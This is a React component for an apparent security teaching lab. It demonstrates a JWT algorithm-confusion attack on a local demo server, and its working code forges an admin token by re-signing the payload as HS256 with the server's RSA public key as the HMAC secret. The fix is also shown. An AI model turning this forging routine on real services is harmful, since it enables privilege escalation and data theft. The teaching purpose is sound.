import React, { useState } from 'react';
import jsrsasign from 'jsrsasign';

const API = 'http://localhost:3001';

const DEFAULT_USERS = [
  { id: 1, username: 'rahul', role: 'admin', email: 'rahul@company.com', password: 'admin@123' },
  { id: 2, username: 'adarsh', role: 'user', email: 'adarsh@gmail.com', password: 'pass123' },
  { id: 3, username: 'sneha', role: 'user', email: 'sneha@gmail.com', password: 'sneha456' },
];

export default function AlgoConfusionDemo() {
  const [token, setToken] = useState('');
  const [fakeToken, setFakeToken] = useState('');
  const [publicKeyText, setPublicKeyText] = useState('');
  const [serverUsers, setServerUsers] = useState(null);
  const [output, setOutput] = useState('...');
  const [isLeaked, setIsLeaked] = useState(false);

  const displayUsers = serverUsers || DEFAULT_USERS;

  const handleLogin = async () => {
    try {
      const res = await fetch(`${API}/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: 'adarsh', password: 'pass123' })
      });
      const data = await res.json();
      setToken(data.token);
      setServerUsers(null);
      setIsLeaked(false);
      setOutput(JSON.stringify(data, null, 2));
    } catch (e) {
      setOutput(JSON.stringify({ error: e.message }, null, 2));
    }
  };

  const handleFetchKey = async () => {
    try {
      const res = await fetch(`${API}/public-key`);
      const text = await res.text();
      setPublicKeyText(text.replace(/\r\n/g, '\n'));
      setOutput(JSON.stringify({ message: "Public key downloaded and normalized successfully. We will use this exact string as our HMAC secret." }, null, 2));
    } catch (e) {
      setOutput(JSON.stringify({ error: e.message }, null, 2));
    }
  };

  const handleAttack = () => {
    try {
      if (!token) return setOutput(JSON.stringify({ error: "Log in first." }, null, 2));
      if (!publicKeyText) return setOutput(JSON.stringify({ error: "Fetch the public key first." }, null, 2));

      // 1. Decode payload
      const parts = token.split('.');
      const base64UrlToB64 = (str) => {
        let b64 = str.replace(/-/g, '+').replace(/_/g, '/');
        while (b64.length % 4) { b64 += '='; }
        return b64;
      };
      
      const payload = JSON.parse(decodeURIComponent(escape(atob(base64UrlToB64(parts[1])))));

      // 2. Escalate privileges
      payload.role = 'admin';

      // 3. Create HS256 Header
      const headerObj = { alg: 'HS256', typ: 'JWT' };
      const b64tob64u = (str) => str.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
      const encHeader = b64tob64u(btoa(JSON.stringify(headerObj)));
      const encPayload = b64tob64u(btoa(JSON.stringify(payload)));
      
      const dataToSign = encHeader + '.' + encPayload;

      // 4. Sign using the Public Key literal string exactly as Node sees it
      const mac = new jsrsasign.KJUR.crypto.Mac({ alg: 'hmacsha256', pass: { utf8: publicKeyText } });
      mac.updateString(dataToSign);
      const signatureHex = mac.doFinal();
      
      const signatureB64 = window.btoa(signatureHex.match(/\w{2}/g).map(a => String.fromCharCode(parseInt(a, 16))).join(''));
      const signatureB64u = b64tob64u(signatureB64);

      const computedFakeToken = dataToSign + '.' + signatureB64u;
      setFakeToken(computedFakeToken);

      setOutput(JSON.stringify({
        message: "Malicious Token Generated!",
        header_changed_to: headerObj,
        payload_changed_to: payload,
        signed_with: "Public Key String via HS256 HMAC (NOT RSA!)"
      }, null, 2));
    } catch (err) {
      setOutput(JSON.stringify({ error: "Exception generating token: " + err.message }, null, 2));
    }
  };

  const handleDash = async (secure) => {
    if (!fakeToken) return setOutput(JSON.stringify({ error: "Generate fake token first." }, null, 2));
    try {
      const endpoint = secure ? 'dashboard-secure' : 'dashboard';
      const res = await fetch(`${API}/${endpoint}`, {
        headers: { Authorization: `Bearer ${fakeToken}` }
      });
      const data = await res.json();

      if (data.all_users) {
        setServerUsers(data.all_users);
        if (!secure) {
          setIsLeaked(true);
          setOutput(JSON.stringify({
            route: "VULNERABLE (No algorithms specified)",
            result: "🔓 SERVER HACKED! Admin data revealed.",
            data
          }, null, 2));
        } else {
          setIsLeaked(false);
          setOutput(JSON.stringify({
            route: "SECURE (algorithms: ['RS256'] forced)",
            result: "✅ SERVER SECURE! Attack rejected.",
            data
          }, null, 2));
        }
      } else {
        setOutput(JSON.stringify({ result: "Blocked.", data }, null, 2));
      }
    } catch (err) {
      setOutput(JSON.stringify({ error: err.message }, null, 2));
    }
  };

  const copyToken = (t) => {
    if (!t) return alert("No token to copy!");
    navigator.clipboard.writeText(t).then(() => alert("Copied!")).catch(() => alert("Failed to copy"));
  };

  return (
    <div className="animation-fade-in">
      <div className="page-header">
        <h1>🔑 Algorithm Confusion (RS256 → HS256)</h1>
        <p>How to hack an asymmetric JWT validation if the backend forgets to specify the allowed <code>algorithms</code> array.</p>
        <div style={{ marginTop: '12px', padding: '12px', backgroundColor: 'rgba(16, 185, 129, 0.1)', border: '1px solid rgba(16, 185, 129, 0.2)', borderRadius: '8px', color: '#34d399' }}>
          <strong>✅ Vulnerability Fixed:</strong> Make sure your <code>jsonwebtoken</code> version is <strong>above 9.0.0</strong> where all these functionalities have been completely fixed! The Algorithm Confusion attack is fully blocked natively in version <strong>9.0.0 (2022)</strong>.
        </div>
      </div>

      <div className="glass-card">
        <h3>Users in the system</h3>
        <div className="table-container">
          <table>
            <thead>
              <tr>
                <th>#</th>
                <th>Username</th>
                <th>Role</th>
                <th>Email</th>
                <th>Password</th>
              </tr>
            </thead>
            <tbody>
              {displayUsers.map(u => {
                let pwdDisplay = '••••••••';
                let rowClass = '';
                let pwdClass = 'pwd-hidden';
                
                if (isLeaked && u.password) {
                  pwdDisplay = u.password;
                  pwdClass = 'pwd-leaked';
                  rowClass = 'highlight-leaked';
                } else if (serverUsers && u.password) {
                  pwdDisplay = u.password;
                  pwdClass = 'pwd-visible';
                } else if (!serverUsers && u.username === 'adarsh') {
                  pwdDisplay = u.password;
                  pwdClass = 'pwd-own';
                  rowClass = 'highlight-current';
                }

                return (
                  <tr key={u.id} className={rowClass}>
                    <td>{u.id}</td>
                    <td>{u.username === 'adarsh' && !serverUsers ? <strong>{u.username}</strong> : u.username}</td>
                    <td><span className={`role-tag role-${u.role}`}>{u.role}</span></td>
                    <td>{u.email || u.username + '@company.com'}</td>
                    <td className={pwdClass}>{pwdDisplay}</td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px' }}>
        <div className="glass-card">
          <h3>Step 1 — Login</h3>
          <p>Login as adarsh / pass123</p>
          <button className="btn-primary" onClick={handleLogin}>Login</button>
          {token && <div className="token-display-box" style={{ color: '#10b981' }}>{token}</div>}
        </div>

        <div className="glass-card">
          <h3>Step 2 — Download Public Key</h3>
          <p>Because RS256 is asymmetric, the backend intentionally shares the public key.</p>
          <button className="btn-secondary" onClick={handleFetchKey}>Fetch Public Key</button>
          {publicKeyText && <pre><code>{publicKeyText}</code></pre>}
        </div>

        <div className="glass-card" style={{ gridColumn: '1 / -1' }}>
          <h3>Step 3 — 😈 Execute Algorithm Confusion Attack</h3>
          <ol style={{ marginLeft: '20px', marginBottom: '16px', color: 'var(--text-secondary)' }}>
            <li>We decode our token payload.</li>
            <li>We change our role to <code>admin</code>.</li>
            <li>Instead of RS256, we set the header <code>{`{"alg": "HS256"}`}</code>.</li>
            <li>We sign this new fake token using the <strong>Public Key text string</strong> as an HMAC password!</li>
          </ol>
          <div className="btn-group">
            <button className="btn-danger" onClick={handleAttack}>Generate Malicious HS256 Token</button>
          </div>
          {fakeToken && (
            <div className="token-display-box" style={{ borderColor: 'rgba(239, 68, 68, 0.5)', marginTop: '16px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
                <span style={{ color: '#ef4444', fontWeight: 'bold' }}>Fake Token:</span>
                <button className="btn-secondary" style={{ padding: '2px 8px', fontSize: '0.8rem' }} onClick={() => copyToken(fakeToken)}>📋 Copy</button>
              </div>
              {fakeToken}
            </div>
          )}
        </div>

        <div className="glass-card" style={{ gridColumn: '1 / -1' }}>
          <h3>Step 4 — Test Dashboards with Malicious Token</h3>
          <p>See why checking the "algorithms" property on jwt.verify is crucial!</p>
          <div className="btn-group">
            <button className="btn-danger" onClick={() => handleDash(false)}>Access Vulnerable Dashboard</button>
            <button className="btn-success" onClick={() => handleDash(true)}>Access Secure Dashboard</button>
          </div>
        </div>
      </div>

      <h3>Console Output</h3>
      <pre className="console-output">{output}</pre>
    </div>
  );
}
